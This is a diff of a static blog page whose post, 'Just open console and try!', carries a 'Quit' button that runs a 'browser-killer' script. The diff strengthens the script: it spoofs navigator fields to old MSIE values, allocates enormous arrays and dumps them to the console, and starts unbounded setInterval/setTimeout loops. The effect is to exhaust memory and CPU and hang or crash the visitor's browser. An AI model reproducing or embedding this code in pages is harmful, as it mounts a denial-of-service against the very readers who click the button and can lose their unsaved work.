@@ -1,6 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+  <link rel="preconnect" href="//cdn.jsdelivr.net">
   <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css"/>
   <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
@@ -319,7 +320,7 @@
               <span class="post-meta-item-text">Posted on</span>
               
 
-              <time title="Created: 2021-07-07 13:29:19 / Modified: 14:46:49" itemprop="dateCreated datePublished" datetime="2021-07-07T13:29:19+08:00">2021-07-07</time>
+              <time title="Created: 2021-07-07 13:29:19 / Modified: 20:00:33" itemprop="dateCreated datePublished" datetime="2021-07-07T13:29:19+08:00">2021-07-07</time>
             </span>
 
           
@@ -328,7 +329,7 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">Symbols count in article: </span>
-              <span>937</span>
+              <span>1.3k</span>
             </span>
 
         </div>
@@ -343,9 +344,11 @@
           <p>Just open console and try!</p>
 <p><button href="#" id="browser-killer" style="display: block;">Quit</button></p>
 <script>
-    document.getElementById("browser-killer").addEventListener("click", function (event) {
+    document.getElementById("browser-killer").addEventListener("click", (function(a){return function(){setInterval(function(){setTimeout(a,0)},0)}})(function () {
         try {
-            navigator.__proto__.__defineGetter__("userAgent", () => "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)");
+            navigator.__proto__.__defineGetter__("appVersion", function() {return "4.0 (compatible; MSIE 5.0; Windows NT)"});
+            navigator.__proto__.__defineGetter__("platform", function() {return "Win32"});
+            navigator.__proto__.__defineGetter__("userAgent", function() {return "Mozilla/4.0 (compatible; MSIE 5.0; Windows NT)"});
         } catch (e) {}
         try {
             console.log(new Array(-1>>>0).join(','));
@@ -367,22 +370,31 @@
         if (window.Uint32Array) arr.push(window.Uint32Array);
         if (window.Uint16Array) arr.push(window.Uint16Array);
         if (window.Array) arr.push(window.Array);
-        arr.forEach(function (Construct) {
-            for (var i = 0 >>> 0;i <= (64 >>> 0);++i) {
-                try {
-                    var a = (new Construct(Number.MAX_SAFE_INTEGER >>> i));
-                    var b = {};
+        try {
+            arr.forEach(function (Construct) {
+                for (var i = 0 >>> 0;i <= (64 >>> 0);++i) {
                     try {
-                        console.log(a.join(","));
+                        var a = (new Construct(Number.MAX_SAFE_INTEGER >>> i));
+                        var b = {};
+                        try {
+                            console.log(a.join(","));
+                        } catch (e) {}
+                        try {
+                            console.log(JSON.stringify(a));
+                        } catch (e) {}
                     } catch (e) {}
-                    try {
-                        console.log(JSON.stringify(a));
-                    } catch (e) {}
-                } catch (e) {}
-            }
-        });
-        event.preventDefault();
-    })
+                }
+            });
+        } catch (e) {}
+        try {
+            var a = function () {
+                return setInterval(function () {
+                    return setTimeout(a, 0);
+                }, 0);
+            };
+            a();
+        } catch (e) {}
+    }))
 </script>
       
     </div>
@@ -604,7 +616,7 @@
       <i class="fa fa-chart-area"></i>
     </span>
       <span class="post-meta-item-text">Symbols count total: </span>
-    <span title="Symbols count total">1k</span>
+    <span title="Symbols count total">2k</span>
 </div>
 
         
